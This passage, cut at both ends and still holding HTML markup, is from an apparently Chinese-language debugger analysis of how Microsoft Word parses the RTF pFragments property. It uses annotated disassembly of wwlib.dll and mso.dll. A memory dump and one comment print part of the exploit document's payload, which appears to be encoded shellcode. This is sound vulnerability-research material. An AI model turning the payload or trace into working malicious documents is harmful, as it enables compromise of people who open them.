<span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E6                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E7                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]             <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EA                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EB                 <span class="keyword">mov</span>     [<span class="built_in">edi</span>+<span class="number">14h</span>], <span class="built_in">eax</span>               <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EE                 <span class="keyword">call</span>    MSO_806                      <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F3                 <span class="keyword">push</span>    <span class="number">5</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F5                 <span class="keyword">pop</span>     <span class="built_in">ecx</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F6                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F8                 <span class="keyword">rep</span> <span class="keyword">movsd</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FA                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FC                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FD                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FE                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FF</span><br><span class="line"><span class="symbol">    .text:</span>329202FF loc_329202FF:                           </span><br><span class="line"><span class="symbol">    .text:</span>329202FF                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">    .text:</span><span class="number">32920300</span>                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31FD7296                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">; eax = 0x1</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7298                 <span class="keyword">jz</span>      loc_31FD731E    <span class="comment">;            ; 为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD729E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">; eax = [ebp-0x64] = [0x0011B268-0x64] = [0x0011B204] = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A1                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">11h</span>        <span class="comment">;            ; eax = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A4                 <span class="keyword">ja</span>      short loc_31FD72E6 <span class="comment">;         ; 大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A6                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">ds</span>:byte_31FD723C[<span class="built_in">eax</span>]   <span class="comment">; eax = [0x31FD723C+0x6] = [0x31FD7242] = 0x02</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72AD                 <span class="keyword">jmp</span>     <span class="built_in">ds</span>:off_31FD7210[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="comment">;     ; [0x31FD7210+eax*4] = [0x31FD7218]</span></span><br><span class="line">= <span class="number">0x319C0556</span>,off_31FD7210为Switch语句跳转表</span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0556 loc_319C0556:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0556                                                      <span class="comment">; jumptable 31FD72AD case 6           </span></span><br><span class="line"><span class="symbol">.text:</span>319C0556                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="number">7674h</span>]             <span class="comment">; esi = [ebx+0x7674] = [0x02347674] = 0x023B0000 &lt;---- (pFragments属性值)</span></span><br><span class="line">    023B0000  <span class="number">36</span> 3B <span class="number">35</span> 3B <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">61</span> <span class="number">63</span> <span class="number">63</span> <span class="number">38</span>  <span class="number">6</span><span class="comment">;5;11111111acc8</span></span><br><span class="line">    023B0010  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span>  <span class="number">4161304161314161</span></span><br><span class="line">    023B0020  <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3241613341613441</span></span><br><span class="line">    023B0030  <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span>  <span class="number">6135416136416137</span></span><br><span class="line">    023B0040  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4161384161394162</span></span><br><span class="line">    023B0050  <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3041623141623241</span></span><br><span class="line">    023B0060  <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">35</span>  <span class="number">6233416234416235</span></span><br><span class="line">    023B0070  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4162364162374162</span></span><br><span class="line">    023B0080  <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3841623941633041</span></span><br><span class="line">    023B0090  <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">6331416332416333</span></span><br><span class="line">    023B00A0  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span>  <span class="number">4163344163354163</span></span><br><span class="line">    023B00B0  <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3641633741633841</span></span><br><span class="line"><span class="symbol">.text:</span>319C055C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C055E loc_319C055E:                           </span><br><span class="line"><span class="symbol">.text:</span>319C055E                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0000] = 0x36 ('6'),3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>319C0561                 <span class="keyword">jz</span>      loc_315E7ED1                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>319C0567                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0001</span></span><br><span class="line"><span class="symbol">.text:</span>319C0568                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x3B(';') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C056B                 <span class="keyword">jnz</span>     short loc_319C055E           <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">315E7ED1    C606 <span class="number">00</span>            <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="number">0x0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x0</span></span><br><span class="line">315E7ED4    <span class="number">46</span>                 <span class="keyword">inc</span> <span class="built_in">esi</span>                              <span class="comment">;   esi = esi+1 = 0x023B0002</span></span><br><span class="line">315E7ED5    E9 93863D00        <span class="keyword">jmp</span> wwlib.319C056D                   <span class="comment">;</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C056D loc_319C056D:                           </span><br><span class="line"><span class="symbol">.text:</span>319C056D                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C056E                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">; 判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ******************************************</span><br><span class="line"></span><br><span class="line">        所属模块: wwlib.dll</span><br><span class="line">        <span class="keyword">int</span> __stdcall sub_31BAF3C6(<span class="keyword">int</span> a1)</span><br><span class="line"></span><br><span class="line">    ******************************************</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C6                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C7                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C9                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                  <span class="comment">; arg1: [ebp+8] = [0x0011B1EC+8] = [0x0011B1F4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CD                 <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                     <span class="comment">;   esi = esi^esi = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CF                 <span class="keyword">call</span>    sub_3203D37F                 <span class="comment">;   去除'\t'和' ', &lt;---- </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: wwlib.dll</span><br><span class="line">            _<span class="built_in">BYTE</span> *__stdcall sub_3203D37F(_<span class="built_in">BYTE</span> *a1)</span><br><span class="line"></span><br><span class="line">        ************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3203D37F                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D380                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1DC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D382                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = [ebp+8] = [0x0011B1E4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D385 loc_3203D385:                           </span><br><span class="line"><span class="symbol">        .text:</span>3203D385                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D387                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">9</span>                    <span class="comment">;   cl = 0x36,0x9='\t'</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D38A                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D390                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">20h</span>                  <span class="comment">;   cl = 0x36,0x20=' '</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D393                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D399                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D39A                 <span class="keyword">retn</span>    <span class="number">4</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x36,0x30='0' &lt;---- 应大于等于0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4 loc_31BAF3B4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0001</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B5                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">39h</span>                      <span class="comment">;   cl = 0x36,0x39='9' &lt;---- 应小于9</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B8                 <span class="keyword">ja</span>      short loc_31BAF3DB           <span class="comment">;   大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BA                 <span class="keyword">imul</span>    <span class="built_in">esi</span>, <span class="number">0Ah</span>                     <span class="comment">;   esi = esi*0xA = 0x0*0xA = 0x0 &lt;---- 乘10，代表el_size和el_count都是用10进制数表示的</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BD                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">cl</span>                      <span class="comment">;   ecx = 0x00000036</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C0                 <span class="keyword">lea</span>     <span class="built_in">esi</span>, [<span class="built_in">esi</span>+<span class="built_in">ecx</span>-<span class="number">30h</span>]           <span class="comment">;   esi = esi+ecx-0x30 = 6 &lt;---- ASCII值转化为整型</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C4                 <span class="keyword">jmp</span>     short loc_31BAF3D4           <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [0x023B0001] = 0x00</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x00,0x30='0'</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB loc_31BAF3DB:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x6 &lt;---- 返回值(pFragments的属性数组参数整型值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DF                 <span class="keyword">retn</span>    <span class="number">4</span>                            <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0573                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                     <span class="comment">;   edi = eax = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C0575                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0577</span><br><span class="line"><span class="symbol">.text:</span>319C0577 loc_319C0577:                          </span><br><span class="line"><span class="symbol">.text:</span>319C0577                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0002] = 0x35('5') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C057A                 <span class="keyword">jnz</span>     loc_31E269F1                 <span class="comment">;   不为0，则跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269F1                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0002] = 0x35('5'),0x3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F4                 <span class="keyword">jz</span>      short loc_31E269FC           <span class="comment">;   为0，则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F6                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0003</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F7                 <span class="keyword">jmp</span>     loc_319C0577                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269FC                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0003] = 0x00</span></span><br><span class="line"><span class="symbol">.text:</span>31E269FF                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0004</span></span><br><span class="line"><span class="symbol">.text:</span>31E26A00                 <span class="keyword">jmp</span>     loc_319C0580                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0580 loc_319C0580:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0580                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0581                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">;   判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line"><span class="symbol">.text:</span>319C0586                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+ppstm], <span class="built_in">eax</span>             <span class="comment">;   [ebp-4] = [0x0011B268-4] = [0x0011B264] = eax = 0x5 &lt;---- el_count</span></span><br><span class="line"><span class="symbol">.text:</span>319C0589                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]             <span class="comment">;   eax = ebp-0x8 = 0x0011B268-8 = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg2: eax = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058D                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C058E                 <span class="keyword">call</span>    MSO_379                      <span class="comment">;   [32081B48] = 0x326ccb92 (wwlib.3167D1C7)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall MSO_379(__int16 a1, _<span class="built_in">DWORD</span> *a2)</span><br><span class="line"></span><br><span class="line">    ************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>326CCB92                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB93                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB95                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg2: esi = 0x023B0004 ASCII "11111111acc8d9e9bdbfaf3c99d97424f45b33c9b13183ebfc316b14036bab4dc9653b133296bb74ba738ab4d8f0bc04aa55"</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB96                 <span class="keyword">push</span>    <span class="number">18h</span>                      <span class="comment">; arg1: 0x18</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB98                 <span class="keyword">call</span>    _MsoPvAllocCore@<span class="number">4</span> <span class="comment">; MsoPvAllocCore(x)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x05D755C8,(UNICODE "Description")(关键对象首地址) &lt;---- 给关键对象分配内存</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9F                 <span class="keyword">jz</span>      loc_32C9662C             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBA5                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], mso.32A0C8C4 <span class="comment">; [eax] = [0x05D755C8] = 0x32A0C8C4(虚表指针) &lt;---- 关键对象的虚表指针</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                 <span class="comment">;   esi = eax = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD</span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD loc_326CCBAD:                          </span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD                 <span class="keyword">test</span>    <span class="built_in">esi</span>, <span class="built_in">esi</span>                 <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAF                 <span class="keyword">jz</span>      loc_32C96633             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB5                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+arg_0]          <span class="comment">;   ax = [ebp+8] = [0x0011B1E8+8] = [0x0011B1F0] = 0x0006(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB9                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg3: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBB                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>            <span class="comment">;   [esi+0xc] = [0x05D755C8+0xc] = [0x05D755D4] = 0x0006 &lt;---- el_size保存到关键对象的第4个dword</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBF                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg2: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC1                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]             <span class="comment">;   eax = esi+4 = 0x05D755C8+4 = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC5                 <span class="keyword">call</span>    MSO_501                  <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ****************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __stdcall MSO_501(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ****************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>326098B5                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B6                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B8                 <span class="keyword">push</span>    <span class="number">0</span>                        <span class="comment">; arg4: 0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]              <span class="comment">; arg3: [ebp+0x10] = [0x0011B1E0] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BD                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg2: [ebp+0xc] = [0x0011B1DC] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C0                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg1: [ebp+0x8] = [0x0011B1D8] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C3                 <span class="keyword">call</span>    sub_32608E17             <span class="comment">; </span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line">            *****************************************************************************</span><br><span class="line"></span><br><span class="line">                所属模块: mso.dll</span><br><span class="line">                signed <span class="keyword">int</span> __stdcall sub_32608E17(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">            *****************************************************************************</span><br><span class="line"><span class="symbol">            .text:</span>32608E17                 <span 